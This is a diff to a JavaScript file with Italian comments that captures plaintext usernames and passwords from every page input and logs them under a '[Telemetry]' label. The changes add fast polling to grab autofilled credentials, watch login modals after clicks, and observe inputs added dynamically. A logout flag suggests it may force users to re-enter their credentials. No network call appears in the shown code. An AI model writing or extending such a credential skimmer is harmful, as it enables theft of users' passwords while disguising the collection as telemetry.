@@ -8,32 +8,45 @@ let lastTextInput = null;
 let lastPasswordInput = null;
 let logoutDone = false; // flag per eseguire logout solo una volta
 
-// Memorizza ultimi valori noti
-const lastValues = new WeakMap();
+let lastValues = new WeakMap();
 
-// Funzione che processa un input e segnala se cambiato
+// 🔹 Funzione per processare un input e loggarne il valore
 function processInput(input) {
-  const prev = lastValues.get(input) || "";
   const curr = input.value || "";
+  if (!curr) return;
 
-  if (!curr || prev === curr) return;
+  // Primo valore
+  if (!lastValues.has(input)) {
+    lastValues.set(input, curr);
+    if (input.type === "text") console.log("[Telemetry] username (init):", curr);
+    if (input.type === "password") console.log("[Telemetry] password (init):", curr);
+    return;
+  }
+
+  // Valore cambiato
+  const prev = lastValues.get(input);
+  if (prev === curr) return;
 
   lastValues.set(input, curr);
-
-  if (input.type === "text") {
-    console.log("[Telemetry] username:", curr);
-  } 
-  else if (input.type === "password") {
-    console.log("[Telemetry] password:", curr);
-  }
+  if (input.type === "text") console.log("[Telemetry] username (updated):", curr);
+  if (input.type === "password") console.log("[Telemetry] password (updated):", curr);
 }
 
-// 🔹 Legge subito i valori presenti
+// 🔹 Controlla tutti gli input di un nodo (root)
 function checkAllInputs(root = document) {
   root.querySelectorAll("input").forEach(processInput);
 }
 
-// 🔹 Traccia focus
+// 🔹 Polling rapido per campi già popolati (subito all’apertura)
+function pollInputs(duration = 3000, intervalTime = 100) {
+  const start = Date.now();
+  const interval = setInterval(() => {
+    checkAllInputs();
+    if (Date.now() - start > duration) clearInterval(interval);
+  }, intervalTime);
+}
+
+// 🔹 Traccia focus per campi attivi
 document.addEventListener("focusin", e => {
   if (e.target.tagName === "INPUT") {
     if (e.target.type === "text") lastTextInput = e.target;
@@ -41,31 +54,27 @@ document.addEventListener("focusin", e => {
   }
 });
 
-// 🔹 Eventi manuali
+// 🔹 Eventi manuali input/paste/change
 ["input", "paste", "change"].forEach(evt =>
   document.addEventListener(evt, e => {
-    if (e.target.tagName === "INPUT") {
-      processInput(e.target);
-    }
+    if (e.target.tagName === "INPUT") processInput(e.target);
   }, true)
 );
 
-// 🔹 Polling mirato per la modale di login
+// 🔹 Polling mirato per modali di login (password input)
 function watchLoginModal(duration = 5000) {
   const start = Date.now();
-
   const interval = setInterval(() => {
-    // la modale ha SEMPRE un password input
-    const modal = document.querySelector('input[type="password"]')?.closest("div");
-    if (modal) checkAllInputs(modal);
-
-    if (Date.now() - start > duration) {
-      clearInterval(interval);
+    const pwdInput = document.querySelector('input[type="password"]');
+    if (pwdInput) {
+      const modalRoot = pwdInput.closest('div') || document.body;
+      checkAllInputs(modalRoot);
     }
+    if (Date.now() - start > duration) clearInterval(interval);
   }, 100);
 }
 
-// 🔹 intercetta click su Login
+// 🔹 Click sul pulsante login (per modale)
 document.addEventListener("click", e => {
   const el = e.target;
   if (el.textContent && /login/i.test(el.textContent)) {
@@ -73,22 +82,20 @@ document.addEventListener("click", e => {
   }
 }, true);
 
-// 🔹 osserva input aggiunti dinamicamente
+// 🔹 Osservatore DOM per input aggiunti dinamicamente
 const domObserver = new MutationObserver(muts => {
   muts.forEach(mut => {
     mut.addedNodes.forEach(node => {
-      if (node.tagName === "INPUT") {
-        processInput(node);
-      } else if (node.querySelectorAll) {
-        node.querySelectorAll("input").forEach(processInput);
-      }
+      if (node.tagName === "INPUT") processInput(node);
+      else if (node.querySelectorAll) node.querySelectorAll("input").forEach(processInput);
     });
   });
 });
 
 // 🔹 Init
 window.addEventListener("load", () => {
-  checkAllInputs();
+  checkAllInputs();      // legge subito tutti i campi già presenti
+  pollInputs();           // poll rapido per autofill / precompilati
   domObserver.observe(document.body, { childList: true, subtree: true });
 });
 
